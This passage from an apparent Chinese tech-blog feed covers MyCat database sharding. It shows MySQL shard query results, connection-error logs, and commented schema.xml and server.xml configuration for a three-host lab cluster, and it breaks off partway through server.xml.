13108379727 | 123359043@qq.com | &#x5F6D;&#x7406;&#x90A6;&#x5C0F;&#x9C9C;&#x8089;&#x8001;&#x5E08;         | klbd muygjo xs iyz hqlghz duucn fjlap dgknrq kkz js ogsga hq cedyjm nzgmy unjpy kky jjh zevor juctq  |</span><br><span class="line">+<span class="comment">----------+----------------+-----+-----+-------------+---------------------+-----------+-------------+------------------+--------------------------+------------------------------------------------------------------------------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.02</span> sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- &#x67E5;&#x8BE2;&#x6570;&#x636E;&#x91CF;</span></span><br><span class="line">mysql&gt; <span class="keyword">select</span> table_schema,table_name <span class="keyword">as</span> <span class="string">&quot;Tables&quot;</span>,<span class="keyword">ROUND</span>(((data_length + index_length)/<span class="number">1024</span>/<span class="number">1024</span>), <span class="number">2</span>) <span class="string">&quot;Size in MB&quot;</span> <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_NAME = <span class="string">&quot;jaking_member&quot;</span> <span class="keyword">order</span> <span class="keyword">by</span> (data_length + index_length) <span class="keyword">desc</span>;</span><br><span class="line">+<span class="comment">----------------+---------------+------------+</span></span><br><span class="line">| table_schema   | Tables        | Size in MB |</span><br><span class="line">+<span class="comment">----------------+---------------+------------+</span></span><br><span class="line">| jakingtestdb01 | jaking_member |       1.52 |</span><br><span class="line">| jakingtestdb02 | jaking_member |       0.41 |</span><br><span class="line">| jakingtestdb05 | jaking_member |       0.39 |</span><br><span class="line">| jakingtestdb03 | jaking_member |       0.39 |</span><br><span class="line">| jakingtestdb11 | jaking_member |       0.39 |</span><br><span class="line">| jakingtestdb08 | jaking_member |       0.39 |</span><br><span class="line">| jakingtestdb07 | jaking_member |       0.39 |</span><br><span class="line">| jakingtestdb06 | jaking_member |       0.38 |</span><br><span class="line">| jakingtestdb04 | jaking_member |       0.38 |</span><br><span class="line">| jakingtestdb12 | jaking_member |       0.38 |</span><br><span class="line">| jakingtestdb09 | jaking_member |       0.38 |</span><br><span class="line">| jakingtestdb10 | jaking_member |       0.36 |</span><br><span class="line">+<span class="comment">----------------+---------------+------------+</span></span><br><span class="line">12 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="&#x67E5;&#x770B;&#x5206;&#x7247;&#x6570;&#x636E;"><a href="#&#x67E5;&#x770B;&#x5206;&#x7247;&#x6570;&#x636E;" class="headerlink" title="&#x67E5;&#x770B;&#x5206;&#x7247;&#x6570;&#x636E;"></a>&#x67E5;&#x770B;&#x5206;&#x7247;&#x6570;&#x636E;</h3><p><strong>192.168.73.21</strong><br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*) ,region from jakingtestdb10.jaking_member group by region;</span><br><span class="line">+<span class="comment">----------+-----------+</span></span><br><span class="line">| count(*) | region    |</span><br><span class="line">+<span class="comment">----------+-----------+</span></span><br><span class="line">|     1363 | &#x5929;&#x6D25;&#x5E02;    |</span><br><span class="line">+<span class="comment">----------+-----------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>192.168.73.22</strong><br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*) ,region from jakingtestdb20.jaking_member group by region;</span><br><span class="line">+<span class="comment">----------+-----------+</span></span><br><span class="line">| count(*) | region    |</span><br><span class="line">+<span class="comment">----------+-----------+</span></span><br><span class="line">|     1448 | &#x6CB3;&#x5317;&#x7701;    |</span><br><span class="line">+<span class="comment">----------+-----------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>192.168.73.23</strong><br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*) ,region from jakingtestdb30.jaking_member group by region;</span><br><span class="line">+<span class="comment">----------+-----------+</span></span><br><span class="line">| count(*) | region    |</span><br><span class="line">+<span class="comment">----------+-----------+</span></span><br><span class="line">|     1448 | &#x8FBD;&#x5B81;&#x7701;    |</span><br><span class="line">+<span class="comment">----------+-----------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x6545;&#x969C;"><a href="#&#x6545;&#x969C;" class="headerlink" title="&#x6545;&#x969C;"></a>&#x6545;&#x969C;</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2022-05-10 01:28:18.943  INFO [$_NIOREACTOR-0-RW] (io.mycat.backend.datasource.PhysicalDatasource$1$1.connectionError(PhysicalDatasource.java:508)) - connection connectionError</span><br><span class="line">2022-05-10 01:28:18.944  INFO [$_NIOREACTOR-0-RW] (io.mycat.net.AbstractConnection.close(AbstractConnection.java:520)) - close connection,reason:stream closed ,MySQLConnection [id=53, lastTime=1652117298929, user=root, schema=jakingtestdb04, old shema=jakingtestdb04, borrowed=false, fromSlaveDB=false, threadId=634, charset=utf8, txIsolation=3, autocommit=true, attachment=null, respHandler=null, host=192.168.73.21, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=false]</span><br><span class="line">2022-05-10 01:28:18.944  INFO [$_NIOREACTOR-0-RW] (io.mycat.backend.datasource.PhysicalDatasource$1$1.connectionError(PhysicalDatasource.java:508)) - connection connectionError</span><br><span class="line">2022-05-10 01:28:18.944  INFO [$_NIOREACTOR-0-RW] (io.mycat.net.AbstractConnection.close(AbstractConnection.java:520)) - close connection,reason:stream closed ,MySQLConnection [id=54, lastTime=1652117298929, user=root, schema=jakingtestdb35, old shema=jakingtestdb35, borrowed=false, fromSlaveDB=false, threadId=566, charset=latin1, txIsolation=3, autocommit=true, attachment=null, respHandler=null, host=192.168.73.23, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=false]</span><br><span class="line">2022-05-10 01:28:18.944  INFO [$_NIOREACTOR-0-RW] (io.mycat.backend.datasource.PhysicalDatasource$1$1.connectionError(PhysicalDatasource.java:508)) - connection connectionError</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MyCat&amp;#x5206;&amp;#x7247;&amp;#x679A;&amp;#x4E3E;&amp;#x64CD;&amp;#x4F5C;&amp;#x2014;&amp;#x2014;&amp;#x5168;&amp;#x56FD;&amp;#x7701;&amp;#x4EFD;&amp;#x5206;&amp;#x7247;&quot;&gt;&lt;a href=&quot;#MyC
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MyCat垂直分表操作</title>
    <link href="https://marnm.github.io//posts/176dc5f3/"/>
    <id>https://marnm.github.io//posts/176dc5f3/</id>
    <published>2022-06-07T04:46:29.000Z</published>
    <updated>2022-06-07T05:10:57.425Z</updated>
    
    <content type="html"><![CDATA[<p><code>schema.xml</code></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE mycat:schema SYSTEM &quot;schema.dtd&quot;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mycat:schema</span> <span class="attr">xmlns:mycat</span>=<span class="string">&quot;http://io.mycat/&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- &#x903B;&#x8F91;&#x5E93;&#x914D;&#x7F6E; mycatdb1,mycatdb2,mycatdb3 &#x662F;&#x903B;&#x8F91;&#x5E93;&#x5E76;&#x4E0D;&#x662F;&#x771F;&#x7684;&#x6570;&#x636E;&#x5E93;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- &#x5176;&#x4E2D; checkSQLschema &#x8868;&#x660E;&#x662F;&#x5426;&#x68C0;&#x67E5;&#x5E76;&#x8FC7;&#x6EE4; SQL &#x4E2D;&#x5305;&#x542B; schema &#x7684;&#x60C5;&#x51B5;:</span></span><br><span class="line"><span class="comment">&#x5982;&#x903B;&#x8F91;&#x5E93;&#x4E3A; mycatdb1&#xFF0C;&#x5219;&#x53EF;&#x80FD;&#x5199;&#x4E3A; select * from mycatdb1.jakingtestdb11&#xFF0C;</span></span><br><span class="line"><span class="comment">&#x6B64;&#x65F6;&#x4F1A;&#x81EA;&#x52A8;&#x8FC7;&#x6EE4; mycatdb1&#xFF0C;SQL &#x53D8;&#x4E3A; select * from jakingtestdb11&#xFF0C;&#x82E5;&#x4E0D;&#x4F1A;&#x51FA;&#x73B0;&#x4E0A;&#x8FF0;&#x5199;&#x6CD5;&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x5173;&#x95ED;&#x5C5E;&#x6027;&#x4E3A; false</span></span><br><span class="line"><span class="comment">checkSQLschema=&quot;false&quot;    select * from mycatdb1.jakingtestdb11;</span></span><br><span class="line"><span class="comment">checkSQLschema=&quot;true&quot;     select * from jakingtestdb11;   --&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- sqlMaxLimit &#x9ED8;&#x8BA4;&#x8FD4;&#x56DE;&#x7684;&#x6700;&#x5927;&#x8BB0;&#x5F55;&#x6570;&#x9650;&#x5236;&#xFF0C;MyCat1.4 &#x7248;&#x672C;&#x91CC;&#x9762;&#xFF0C;&#x7528;&#x6237;&#x7684; Limit &#x53C2;&#x6570;&#x4F1A; &#x8986;&#x76D6;&#x6389; MyCat &#x7684; sqlMaxLimit &#x9ED8;&#x8BA4;&#x8BBE;&#x7F6E;--&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- &#x6BCF;&#x4E2A;&#x903B;&#x8F91;&#x5E93;&#x5BF9;&#x5E94;&#x4E00;&#x4E2A; schema ,&#x6BCF;&#x4E2A;schema &#x5BF9;&#x5E94;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x8282;&#x70B9; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">schema</span> <span class="attr">name</span>=<span class="string">&quot;mycatdb1&quot;</span> <span class="attr">checkSQLschema</span>=<span class="string">&quot;false&quot;</span> <span class="attr">sqlMaxLimit</span>=<span class="string">&quot;100&quot;</span> <span class="attr">dataNode</span>=<span class="string">&quot;dnmycatdb1&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">schema</span> <span class="attr">name</span>=<span class="string">&quot;mycatdb2&quot;</span> <span class="attr">checkSQLschema</span>=<span class="string">&quot;false&quot;</span> <span class="attr">sqlMaxLimit</span>=<span class="string">&quot;100&quot;</span> <span class="attr">dataNode</span>=<span class="string">&quot;dnmycatdb2&quot;</span>/&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">schema</span> <span class="attr">name</span>=<span class="string">&quot;mycatdb3&quot;</span> <span class="attr">checkSQLschema</span>=<span class="string">&quot;false&quot;</span> <span class="attr">sqlMaxLimit</span>=<span class="string">&quot;100&quot;</span> <span class="attr">dataNode</span>=<span class="string">&quot;dnmycatdb3&quot;</span>/&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">schema</span> <span class="attr">name</span>=<span class="string">&quot;mycatdb4&quot;</span> <span class="attr">checkSQLschema</span>=<span class="string">&quot;false&quot;</span> <span class="attr">sqlMaxLimit</span>=<span class="string">&quot;100&quot;</span> <span class="attr">dataNode</span>=<span class="string">&quot;dnmycatdb4&quot;</span>/&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">schema</span> <span class="attr">name</span>=<span class="string">&quot;mycatdb5&quot;</span> <span class="attr">checkSQLschema</span>=<span class="string">&quot;false&quot;</span> <span class="attr">sqlMaxLimit</span>=<span class="string">&quot;100&quot;</span> <span class="attr">dataNode</span>=<span class="string">&quot;dnmycatdb5&quot;</span>/&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">schema</span> <span class="attr">name</span>=<span class="string">&quot;mycatdb6&quot;</span> <span class="attr">checkSQLschema</span>=<span class="string">&quot;false&quot;</span> <span class="attr">sqlMaxLimit</span>=<span class="string">&quot;100&quot;</span> <span class="attr">dataNode</span>=<span class="string">&quot;dnmycatdb6&quot;</span>/&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">schema</span> <span class="attr">name</span>=<span class="string">&quot;mycatdb7&quot;</span> <span class="attr">checkSQLschema</span>=<span class="string">&quot;false&quot;</span> <span class="attr">sqlMaxLimit</span>=<span class="string">&quot;100&quot;</span> <span class="attr">dataNode</span>=<span class="string">&quot;dnmycatdb7&quot;</span>/&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">schema</span> <span class="attr">name</span>=<span class="string">&quot;mycatdb8&quot;</span> <span class="attr">checkSQLschema</span>=<span class="string">&quot;false&quot;</span> <span class="attr">sqlMaxLimit</span>=<span class="string">&quot;100&quot;</span> <span class="attr">dataNode</span>=<span class="string">&quot;dnmycatdb8&quot;</span>/&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">schema</span> <span class="attr">name</span>=<span class="string">&quot;mycatdb9&quot;</span> <span class="attr">checkSQLschema</span>=<span class="string">&quot;false&quot;</span> <span class="attr">sqlMaxLimit</span>=<span class="string">&quot;100&quot;</span> <span class="attr">dataNode</span>=<span class="string">&quot;dnmycatdb9&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- &#x8868;&#x5206;&#x7247;&#x914D;&#x7F6E;&#x5728;&#x8FD9;&#x91CC; --&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--&lt;/schema&gt; --&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-- &#x5B9A;&#x4E49; MyCat &#x7684;&#x6570;&#x636E;&#x8282;&#x70B9;&#xFF0C;&#x8282;&#x70B9;&#x914D;&#x7F6E; jakingtestdb01,jakingtestdb02,jakingtestdb03 &#x624D;&#x662F;&#x771F;&#x6B63;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C; </span></span><br><span class="line"><span class="comment">dataNode &#x4E2D;&#x7684; name &#x6570;&#x636E;&#x8868;&#x793A;&#x8282;&#x70B9;&#x540D;&#x79F0;&#xFF0C; dataHost &#x8868;&#x793A;&#x6570;&#x636E;&#x4E3B;&#x673A;&#x540D;&#x79F0;&#xFF0C; </span></span><br><span class="line"><span class="comment">database &#x8868;&#x793A;&#x8BE5;&#x8282;&#x70B9;&#x8981;&#x8DEF;&#x7531;&#x7684;&#x6570;&#x636E;&#x5E93;&#x7684;&#x540D;&#x79F0; --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- &#x8BBE;&#x5B9A;&#x6570;&#x636E;&#x7ED3;&#x70B9; dnmycatdb1-3 &#x5BF9;&#x5E94;&#x7684; 192.168.10.12 &#x670D;&#x52A1; &#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684;&#x7269;&#x7406; schema --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb1&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;jaking12&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb01&quot;</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb2&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;jaking12&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb02&quot;</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb3&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;jaking12&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb03&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- &#x8BBE;&#x5B9A;&#x6570;&#x636E;&#x7ED3;&#x70B9; dnmycatdb4-6 &#x5BF9;&#x5E94;&#x7684; 192.168.10.13 &#x670D;&#x52A1; &#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684;&#x7269;&#x7406; schema --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb4&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;jaking13&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb04&quot;</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb5&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;jaking13&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb05&quot;</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb6&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;jaking13&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb06&quot;</span> /&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- &#x8BBE;&#x5B9A;&#x6570;&#x636E;&#x7ED3;&#x70B9; dnmycatdb7-9 &#x5BF9;&#x5E94;&#x7684; 192.168.10.14 &#x670D;&#x52A1; &#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684;&#x7269;&#x7406; schema --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb7&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;jaking14&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb07&quot;</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb8&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;jaking14&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb08&quot;</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">dataNode</span> <span class="attr">name</span>=<span class="string">&quot;dnmycatdb9&quot;</span> <span class="attr">dataHost</span>=<span class="string">&quot;jaking14&quot;</span> <span class="attr">database</span>=<span class="string">&quot;jakingtestdb09&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- &#x8BFB;&#x5199;&#x5206;&#x79BB;&#x7684;&#x914D;&#x7F6E; --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- dataHost &#x914D;&#x7F6E;&#x7684;&#x662F;&#x5B9E;&#x9645;&#x7684;&#x540E;&#x7AEF;&#x6570;&#x636E;&#x5E93;&#x96C6;&#x7FA4;&#xFF08;&#x5F53;&#x7136;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x975E;&#x96C6;&#x7FA4;&#xFF09; --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &#x6CE8;&#x610F;&#xFF1A; schema &#x4E2D;&#x7684;&#x6BCF;&#x4E00;&#x4E2A; dataHost &#x4E2D;&#x7684; host &#x5C5E;&#x6027;&#x503C;&#x5FC5;&#x987B;&#x552F;&#x4E00;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x51FA;&#x73B0;&#x4E3B;&#x4ECE;&#x5728;&#x6240;&#x6709; dataHost &#x4E2D;&#x5168;&#x90E8;&#x5207;&#x6362;&#x7684;&#x73B0;&#x8C61; --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &#x5B9A;&#x4E49;&#x6570;&#x636E;&#x4E3B;&#x673A; dtHost1&#xFF0C;&#x53EA;&#x8FDE;&#x63A5;&#x5230; MySQL &#x8BFB;&#x5199;&#x5206;&#x79BB;&#x96C6;&#x7FA4;&#x4E2D;&#x7684; Master &#x8282;&#x70B9;&#xFF0C;&#x4E0D;&#x4F7F;&#x7528; MyCat &#x6258;&#x7BA1; MySQL &#x4E3B;&#x4ECE;&#x5207;&#x6362; --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">&lt;dataHost name=&quot;dtHost1&quot; maxCon=&quot;500&quot; minCon=&quot;20&quot; balance=&quot;0&quot; </span></span><br><span class="line"><span class="comment">writeType=&quot;0&quot; dbType=&quot;mysql&quot; dbDriver=&quot;native&quot; switchType=&quot;1&quot; slaveThreshold=&quot;100&quot;&gt; </span></span><br><span class="line"><span class="comment">&lt;heartbeat&gt;select user()&lt;/heartbeat&gt; </span></span><br><span class="line"><span class="comment">&lt;writeHost host=&quot;hostM1&quot; url=&quot;192.168.10.63:3306&quot; user=&quot;root&quot; password=&quot;lyz&quot; /&gt; </span></span><br><span class="line"><span class="comment">&lt;/dataHost&gt; </span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- &#x8BBE;&#x5B9A; 192.168.10.12 &#x76EE;&#x524D;&#x53EA;&#x914D;&#x4E86;&#x4E00;&#x53F0;&#x7269;&#x7406;&#x673A;&#xFF0C;&#x82E5;&#x8981;&#x505A;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x4E0A;&#x9762;&#x7684;&#x90E8;&#x5206; --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">dataHost</span> <span class="attr">name</span>=<span class="string">&quot;jaking12&quot;</span> <span class="attr">maxCon</span>=<span class="string">&quot;1000&quot;</span> <span class="attr">minCon</span>=<span class="string">&quot;10&quot;</span> <span class="attr">balance</span>=<span class="string">&quot;1&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">writeType</span>=<span class="string">&quot;0&quot;</span> <span class="attr">dbType</span>=<span class="string">&quot;mysql&quot;</span> <span class="attr">dbDriver</span>=<span class="string">&quot;native&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">heartbeat</span>&gt;</span>select user()<span class="tag">&lt;/<span class="name">heartbeat</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-- can have multi write hosts --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">writeHost</span> <span class="attr">host</span>=<span class="string">&quot;192.168.10.12&quot;</span> <span class="attr">url</span>=<span class="string">&quot;192.168.10.12:3306&quot;</span> <span class="attr">user</span>=<span class="string">&quot;root&quot;</span> <span class="attr">password</span>=<span class="string">&quot;123456&quot;</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">dataHost</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dataHost</span> <span class="attr">name</span>=<span class="string">&quot;jaking13&quot;</span> <span class="attr">maxCon</span>=<span class="string">&quot;1000&quot;</span> <span class="attr">minCon</span>=<span class="string">&quot;10&quot;</span> <span class="attr">balance</span>=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">writeType</span>=<span class="string">&quot;0&quot;</span> <span class="attr">dbType</span>=<span class="string">&quot;mysql&quot;</span> <span class="attr">dbDriver</span>=<span class="string">&quot;native&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">heartbeat</span>&gt;</span>select user()<span class="tag">&lt;/<span class="name">heartbeat</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-- can have multi write hosts --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">writeHost</span> <span class="attr">host</span>=<span class="string">&quot;192.168.10.13&quot;</span> <span class="attr">url</span>=<span class="string">&quot;192.168.10.13:3306&quot;</span> <span class="attr">user</span>=<span class="string">&quot;root&quot;</span> <span class="attr">password</span>=<span class="string">&quot;123456&quot;</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">dataHost</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dataHost</span> <span class="attr">name</span>=<span class="string">&quot;jaking14&quot;</span> <span class="attr">maxCon</span>=<span class="string">&quot;1000&quot;</span> <span class="attr">minCon</span>=<span class="string">&quot;10&quot;</span> <span class="attr">balance</span>=<span class="string">&quot;1&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">writeType</span>=<span class="string">&quot;0&quot;</span> <span class="attr">dbType</span>=<span class="string">&quot;mysql&quot;</span> <span class="attr">dbDriver</span>=<span class="string">&quot;native&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">heartbeat</span>&gt;</span>select user()<span class="tag">&lt;/<span class="name">heartbeat</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-- can have multi write hosts --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">writeHost</span> <span class="attr">host</span>=<span class="string">&quot;192.168.10.14&quot;</span> <span class="attr">url</span>=<span class="string">&quot;192.168.10.14:3306&quot;</span> <span class="attr">user</span>=<span class="string">&quot;root&quot;</span> <span class="attr">password</span>=<span class="string">&quot;123456&quot;</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">dataHost</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">mycat:schema</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p><code>server.xml</code></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- &#x5F00;&#x901A;root&#x7528;&#x6237;&#x8BBF;&#x95EE;mycatdb&#x8BBF;&#x95EE;&#x6743;&#x9650; mycatdbx&#x662F;&#x865A;&#x62DF;&#x7684;schema --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span> <span class="attr">name</span>=<span class="string">&quot;root&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">property</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span 